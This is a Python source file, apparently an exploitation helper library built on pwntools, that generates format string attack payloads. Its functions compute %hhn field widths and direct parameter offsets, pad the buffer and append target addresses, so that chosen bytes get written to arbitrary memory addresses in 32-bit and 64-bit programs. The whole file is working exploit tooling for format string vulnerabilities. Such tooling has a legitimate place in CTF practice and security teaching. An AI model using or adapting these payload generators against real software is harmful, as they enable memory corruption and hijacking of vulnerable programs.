
from pwn import * 

def calculate_next_fmt_string_field_width_char(bytes_written, target_next_byte,debug=False):
    field_width = target_next_byte - (bytes_written % 256)
    if debug:
        print("Debugging in calculate_next_fmt_string_field_width_char")
        print("bytes_written = " + hex(bytes_written))
        print("target_nex_byte = " + hex(target_next_byte))
        print("field_width = " + hex(field_width))
    if field_width < 9: # There's a minimum width and I want this to work for 32-bit and 64-bit applications
        field_width += 256
    if debug:
        print("field_width after if statement = " + hex(field_width))
    return field_width

# Useful library function to write a format string with four byte writes.
# 1. Take the input as a byte string, e.g. "\xab\x85\x04\x08"
# 2. Convert each byte in the string into its corresponding integer
# 3. Take in the length of the buffer of A's before the input 
#    referenced by the direct parameter access, as well as the 
#    direct parameter number.
# 4. Do the calculations, reduce the A's, check the length of the resulting 
#    string, re-pad with A's. This function is designed for a 32-bit
#    architecture.
# dpn: direct parameter number
# src: the four-byte string to get written to an arbitrary location
# dst: the address to get written to, as an integer
# buf_length: the length of the buffer of A's (and other content) prior to the 
#      location in the payload referenced by dpn
def gen_fmt_string_write_x86_first_half(src, dpn):
    n_bytes_written = 0
    payload = b""
    # Writing four chars
    for i in range(4):
        #byte_to_write = ord(src[i]) # old approach for python2
        byte_to_write = src[i]
        #last_byte_of_n_bytes_written = n_bytes_written % 256
        # The field width means we'll sometimes print 8 bytes even if the 
        # minimum width is less
        #n_bytes_to_write_this_round = byte_to_write - last_byte_of_n_bytes_written
        #if n_bytes_to_write_this_round < 8:
        #    n_bytes_to_write_this_round += 256
        #
        field_width = calculate_next_fmt_string_field_width_char(n_bytes_written, byte_to_write) 
        payload += b"%"
        payload += str(field_width).encode()
        payload += b"x"
        payload += b"%"
        payload += str(dpn+i).encode()
        payload += b"$hhn"
        n_bytes_written += field_width
    return(payload)

# Main function: takes src (what to write) and dst (what to write to) as integers. 
def gen_fmt_string_write_exploit_x86(src, dst, dpn, buf_length):
    fmt_string = gen_fmt_string_write_x86_first_half(p32(src), dpn)
    while len(fmt_string) > buf_length:
        buf_length += 4
        dpn += 1
        fmt_string = gen_fmt_string_write_x86_first_half(p32(src), dpn)
    # Add padding if necessary
    if buf_length - len(fmt_string) > 0:
        fmt_string += b"A"*(buf_length - len(fmt_string))
    # Locations where the chars are going to be written
    #print("In gen_fmt_string_write_exploit_x86: dst format = " + str(dst.__class__))
    for i in range(4):
        fmt_string += p32(dst+i)
    return fmt_string

# Useful library function to write a format string with four byte writes.
# 1. Take the input as a byte string, e.g. "\xab\x85\x04\x08"
# 2. Convert each byte in the string into its corresponding integer
# 3. Take in the length of the buffer of A's before the input 
#    referenced by the direct parameter access, as well as the 
#    direct parameter number.
# 4. Do the calculations, reduce the A's, check the length of the resulting 
#    string, re-pad with A's. This function is designed for a 32-bit
#    architecture.
# dpn: direct parameter number
# src: the four-byte string to get written to an arbitrary location
# dst: the address to get written to, as an integer
# buf_length: the length of the buffer of A's (and other content) prior to the 
#      location in the payload referenced by dpn
def gen_fmt_string_write_x86_64_first_half(src, dpn):
    n_bytes_written = 0
    payload = b""
    # Writing eight chars
    for i in range(8):
        #byte_to_write = ord(src[i]) # old approach for python2
        byte_to_write = src[i]
        #last_byte_of_n_bytes_written = n_bytes_written % 256
        # The field width means we'll sometimes print 8 bytes even if the 
        # minimum width is less
        #n_bytes_to_write_this_round = byte_to_write - last_byte_of_n_bytes_written
        #if n_bytes_to_write_this_round < 8:
        #    n_bytes_to_write_this_round += 256
        #
        field_width = calculate_next_fmt_string_field_width_char(n_bytes_written, byte_to_write) 
        payload += b"%"
        payload += str(field_width).encode()
        payload += b"x"
        payload += b"%"
        payload += str(dpn+i).encode()
        payload += b"$hhn"
        n_bytes_written += field_width
    return(payload)

# Main function: takes src (what to write) and dst (what to write to) as integers. 
def gen_fmt_string_write_exploit_x86_64(src, dst, dpn, buf_length):
    fmt_string = gen_fmt_string_write_x86_64_first_half(p64(src), dpn)
    while len(fmt_string) > buf_length:
        buf_length += 8
        dpn += 1
        fmt_string = gen_fmt_string_write_x86_64_first_half(p64(src), dpn)
    # Add padding if necessary
    if buf_length - len(fmt_string) > 0:
        fmt_string += b"A"*(buf_length - len(fmt_string))
    # Locations where the chars are going to be written
    #print("In gen_fmt_string_write_exploit_x86: dst format = " + str(dst.__class__))
    for i in range(8):
        fmt_string += p64(dst+i)
    return fmt_string